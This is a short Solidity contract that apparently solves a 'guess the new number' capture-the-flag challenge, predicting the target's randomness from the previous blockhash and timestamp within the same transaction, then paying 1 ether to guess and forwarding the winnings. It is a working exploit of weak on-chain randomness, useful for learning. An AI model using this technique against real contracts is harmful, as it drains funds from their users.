// SPDX-License-Identifier: MIT
pragma solidity ^0.4.21;

interface IChallenge {
    function guess(uint8 n) external payable;
}

contract GuessTheNewNumberSolver {
    function solve(address challengeAddress) public payable {
        require(msg.value == 1 ether);

        // Compute the same answer using current timestamp and previous blockhash
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        // Call the challenge with the correct guess and 1 ether
        IChallenge(challengeAddress).guess.value(1 ether)(answer);

        // Forward any reward back to sender
        msg.sender.transfer(address(this).balance);
    }

    function() public payable {}
}
